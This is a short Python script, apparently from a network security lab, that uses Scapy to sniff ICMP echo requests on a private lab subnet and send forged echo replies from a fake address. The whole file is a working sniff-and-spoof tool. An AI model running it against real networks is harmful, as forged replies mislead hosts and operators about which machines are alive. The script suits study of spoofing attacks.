from scapy.all import *
from scapy.layers.inet import ICMP, IP

# Define the IP address of attacker machine
attacker_ip = "10.9.0.1"

# Define the IP address of the target machine
target_ip = "10.9.0.5"

# Define the IP address of the fake machine
fake_ip = "10.9.0.6"


def sniff_and_spoof(pkt):
    # Check if the packet is an ICMP echo
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
        print("Got request")
        # Create a new packet with the spoofed source IP address
        spoofed_pkt = IP(src=fake_ip, dst=target_ip, ttl=pkt[IP].ttl, id=pkt[IP].id) / ICMP(type=0, id=pkt[ICMP].id,
                                                                                            seq=pkt[ICMP].seq) / pkt[Raw].load
        # Send the spoofed packet
        send(spoofed_pkt, verbose=False)
        print("Sent spoof")
        # Print a message to indicate that a packet has been spoofed
        print("Spoofed packet sent: {} -> {}".format(spoofed_pkt[IP].src, spoofed_pkt[IP].dst))
        print("***********************************************************************")


if __name__ == "__main__":
    interfaces = get_if_list()
    attacker_interface = next((interface for interface in interfaces if interface.startswith('b')), None)

    # Start sniffing packets on the LAN
    print("Start Snoofing...")
    sniff(filter="icmp", prn=sniff_and_spoof, iface=attacker_interface)